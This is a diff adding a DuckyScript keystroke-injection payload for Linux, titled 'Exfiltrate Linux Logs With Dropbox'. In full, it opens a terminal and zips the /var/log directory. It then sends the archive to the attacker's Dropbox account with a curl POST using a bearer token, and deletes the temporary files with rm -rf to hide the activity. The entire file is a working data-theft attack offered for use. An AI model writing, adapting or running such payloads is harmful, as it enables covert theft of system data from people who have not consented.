@@ -1,0 +1,80 @@
+REM ######################################################
+REM #                                                    |
+REM # Title        : Exfiltrate Linux Logs With Dropbox  |
+REM # Author       : Aleff                               |
+REM # Version      : 1.0                                 |
+REM # Category     : Exfiltration, Execution             |
+REM # Target       : Linux                               |
+REM #                                                    |
+REM ######################################################
+
+REM Requirements:
+REM     - Internet Connection
+REM     - Dropbox Account
+REM     - - DROPBOX_ACCESS_TOKEN
+
+
+DELAY 1000
+CTRL-ALT t
+
+REM Required: Set here your Dropbox access TOKEN
+DELAY 2000
+DEFINE TOKEN example
+STRING ACCESS_TOKEN="
+STRING TOKEN
+STRING "
+ENTER
+
+
+DELAY 500
+STRING USER_NAME=$(whoami)
+ENTER
+
+REM Create random num
+DELAY 500
+STRING RANDOM=$(shuf -i 1-999999999999 -n 1)
+ENTER
+
+REM Folder path
+DELAY 500
+STRING TMP_FOLDER_PATH=$(mktemp -d -p "/home/$USER_NAME/tmp/" prefix-XXXXXXXXXX)
+ENTER
+
+REM Zip path
+DELAY 500
+STRING ZIP_NAME="$RANDOM.zip"
+ENTER
+DELAY 500
+STRING ZIP_PATH="$TMP_FOLDER_PATH/$ZIP_NAME"
+ENTER
+
+REM Default log path
+DELAY 500
+STRING LOG_PATH="/var/log/"
+ENTER
+
+DELAY 500
+STRING zip -r "$ZIP_PATH" "$LOG_PATH"
+ENTER
+
+REM Delay of zipping operation - it depends
+DELAY 10000
+
+DELAY 500
+STRING DROPBOX_FOLDER="/$ZIP_NAME"
+ENTER
+
+REM Send to Dropbox function
+DEFINE DROPBOX_API_LINK https://content.dropboxapi.com/2/files/upload
+DELAY 500
+STRING curl -X POST 
+STRING DROPBOX_API_LINK 
+STRING --header "Authorization: Bearer $ACCESS_TOKEN" --header "Dropbox-API-Arg: {\"path\": \"$DROPBOX_FOLDER\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" --header "Content-Type: application/octet-stream" --data-binary "@$ZIP_PATH"
+ENTER
+
+REM Send timing - it depends
+DELAY 5000
+
+DELAY 500
+STRING rm -rf "$TMP_FOLDER_PATH"
+ENTER
